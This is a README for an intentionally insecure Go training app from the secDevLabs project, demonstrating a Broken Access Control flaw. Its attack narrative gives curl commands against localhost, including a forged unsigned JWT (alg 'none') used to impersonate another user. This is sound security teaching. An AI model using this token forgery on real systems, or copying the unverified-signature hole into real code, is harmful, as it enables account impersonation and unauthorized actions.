# Camp Crystal Lake API

<p align="center">
    <img src="images/camplake.png" width="400" height="400"/>
</p>

Camp Crystal Lake API is a simple Golang web application that contains an example of a Broken Access Control vulnerability and its main goal is to describe how a malicious user could exploit it.

## Index

- [Definition](#what-is-broken-access-control)
- [Setup](#setup)
- [Attack narrative](#attack-narrative)
- [Objectives](#secure-this-app)
- [Solutions](#pr-solutions)
- [Contributing](#contributing)

## What is Broken Access Control?

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits. 

Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access to other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.

The main goal of this app is to discuss how **Broken Access Control** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup

To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh
cd secDevLabs/owasp-top10-2021-apps/a1/camp-lake-api
```

```sh
make install
```

Then simply visit [localhost:20001][App] ! 😆

## Get to know the app 💵

To properly understand how this application works, you can follow this step:

- Registering a user, log in and create a new post!

## Attack narrative

Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜

### 👀

#### Incorrect JWT validation, such as not validating the signature algorithm used, allows malicious users to create fake tokens and abuse JWT non-validation.

To better understand how the API works, we'll create a new user.

For this example we create the user with the following login credentials - `campLakeAdmin:campLake2021`

```sh
curl -s -H "Content-Type: application/json" -d '{"username":"campLakeAdmin","password":"campLake2021"}' http://localhost:20001/register  
```

<p align="center">
    <img src="images/attack_1.png"/>
</p>

With the created user, we will login to the application with their credentials to get the JWT token. As it is a test application, the JWT token is returned to the user as soon as he is logged in.

```sh
curl -s -H "Content-Type: application/json" -d '{"username":"campLakeAdmin","password":"campLake2021"}' http://localhost:20001/login
```

<p align="center">
    <img src="images/attack_2.png"/>
</p>

<p align="center">
    <img src="images/attack_4.png"/>
</p>

In possession of the JWT token, we can create a new post in the API, making a POST request directly to the authenticated route `newPost`.

```sh
curl -s -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhbXBMYWtlQWRtaW4iLCJleHAiOjE2MzMzODI5MzR9.aW4BTVuXaozSbF6EAJfRNsApRA_1hfk2OhaLAo250Uo' -d '{"title": "New member ", "post": "Today a new member ..."}' http://localhost:20001/newpost
```

<p align="center">
    <img src="images/attack_3.png"/>
</p>

### 🔥

However, the API does not verify the signature used by the JWT token, any malicious user can create a fake token, as shown by the image:

<p align="center">
    <img src="images/attack_5.png"/>
</p>

```sh
curl -s -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Imphc29uVm9vcmhlc3MiLCJleHAiOjE2MzMzODM1ODZ9.' -d '{"title": "New member ", "post": "Today a new member ..."}' http://localhost:20001/newpost
```

<p align="center">
    <img src="images/attack_6.png"/>
</p>


## Secure this app

How would you mitigate this vulnerability? After your changes, an attacker should not be able to:

* Use fake tokens without a valid signature.
* Impersonate other users through manipulation of the JWT.

## PR solutions

[Spoiler alert 🚨 ] To understand how this vulnerability can be mitigated, check out [these pull requests]()!

## Contributing

We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉

[Docker Install]:  https://docs.docker.com/install/
[Docker Compose Install]: https://docs.docker.com/compose/install/
[App]: http://localhost:10005
[secDevLabs]: https://github.com/globocom/secDevLabs
[2]:https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a5/ecommerce-api